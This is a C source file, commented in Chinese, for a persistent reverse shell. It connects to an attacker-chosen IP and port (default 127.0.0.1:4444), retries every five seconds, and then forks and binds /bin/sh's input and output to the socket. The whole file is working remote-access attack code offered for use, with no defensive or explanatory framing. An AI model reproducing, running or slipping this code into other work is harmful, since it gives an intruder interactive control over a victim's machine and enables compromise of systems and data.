#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#define DEFAULT_PORT 4444 // 默认端口
#define DEFAULT_IP "127.0.0.1" // 默认IP
#define RETRY_DELAY 5 // 重试间隔

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in server_addr;
    int opt = 1;
    char *ip = DEFAULT_IP; // 默认IP
    int port = DEFAULT_PORT; // 默认端口

    // 解析命令行参数
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            if (i + 1 < argc) {
                ip = argv[++i]; // 获取IP地址
            } else {
                fprintf(stderr, "Error: -h option requires an IP address.\n");
                exit(EXIT_FAILURE);
            }
        } else if (strcmp(argv[i], "-p") == 0) {
            if (i + 1 < argc) {
                port = atoi(argv[++i]); // 获取端口号
            } else {
                fprintf(stderr, "Error: -p option requires a port number.\n");
                exit(EXIT_FAILURE);
            }
        }
    }

    while (1) {
        // 创建 socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            perror("Socket creation failed");
            sleep(RETRY_DELAY);
            continue;
        }

        // 设置 socket 选项
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
            perror("Setsockopt failed");
            close(sock);
            sleep(RETRY_DELAY);
            continue;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip);

        // 尝试连接
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
            perror("Connection failed");
            close(sock);
            fprintf(stderr, "Retrying in %d seconds...\n", RETRY_DELAY);
            sleep(RETRY_DELAY);
            continue;
        }

        // 连接成功，创建子进程执行 shell
        pid_t pid = fork();
        if (pid == -1) {
            perror("Fork failed");
            close(sock);
            exit(EXIT_FAILURE);
        } else if (pid == 0) { // 子进程
            // 子进程中执行 shell
            dup2(sock, STDOUT_FILENO);
            dup2(sock, STDIN_FILENO);
            dup2(sock, STDERR_FILENO);
            close(sock);

            char *shell = "/bin/sh";
            char *argv_shell[] = {shell, NULL};
            execve(shell, argv_shell, NULL);
            perror("Execve failed");
            _exit(EXIT_FAILURE);
        } else { 
            close(sock);
            wait(NULL);
        }
    }

    return 0;
}
